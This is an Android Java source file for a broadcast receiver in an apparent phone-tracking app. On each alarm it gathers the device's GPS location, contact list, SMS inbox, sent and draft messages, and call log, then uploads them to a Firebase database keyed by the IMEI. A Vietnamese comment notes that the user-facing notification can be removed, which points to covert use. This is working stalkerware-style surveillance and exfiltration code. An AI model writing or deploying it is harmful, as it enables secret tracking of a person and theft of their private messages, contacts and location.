package com.codepath.vtracker.tracker.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.codepath.vtracker.tracker.models.TrackerInfo;
import com.codepath.vtracker.tracker.services.MySimpleService;
import com.codepath.vtracker.tracker.utils.GPSTracker;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import static com.codepath.vtracker.tracker.utils.ComunicationUtils.getCallLog;
import static com.codepath.vtracker.tracker.utils.ComunicationUtils.getContactList;
import static com.codepath.vtracker.tracker.utils.ComunicationUtils.getSMS;
import static com.codepath.vtracker.tracker.utils.ComunicationUtils.getUniqueIMEIId;

public class MyAlarmReceiver extends BroadcastReceiver {
	public static final int REQUEST_CODE = 12345;
	public static final String ACTION = "com.codepath.example.servicesdemo.alarm";

	//Khai bao db cua firebase
	private DatabaseReference mDatabase;

	@Override
	public void onReceive(Context context, Intent intent) {
		mDatabase = FirebaseDatabase.getInstance().getReference();
		Log.d("DEBUG", "MyAlarmReceiver triggered");
		GPSTracker mGPS = new GPSTracker(context);
		String longText = "";
		if(mGPS.canGetLocation() ){
			mGPS.getLocation();

			TrackerInfo trackerInfo = new TrackerInfo(mGPS.getLatitude()+"",
					mGPS.getLongitude()+"",
					getContactList(context),
					getSMS("content://sms/inbox", context),
                    getSMS("content://sms/sent", context),
                    getSMS("content://sms/draft", context),
                    getCallLog(context));



			mDatabase.child(getUniqueIMEIId(context)).child(System.currentTimeMillis()+"").setValue(trackerInfo);

		}else{
			System.out.println("Unable");
		}
		//Xoa may dong duoi di neu khong muon show notify
		Intent i = new Intent(context, MySimpleService.class);
		i.putExtra("foo", "alarm!!");
		i.putExtra("receiver", MySimpleReceiver.setupServiceReceiver(context));
		MySimpleService.enqueueWork(context, i);
	}


}
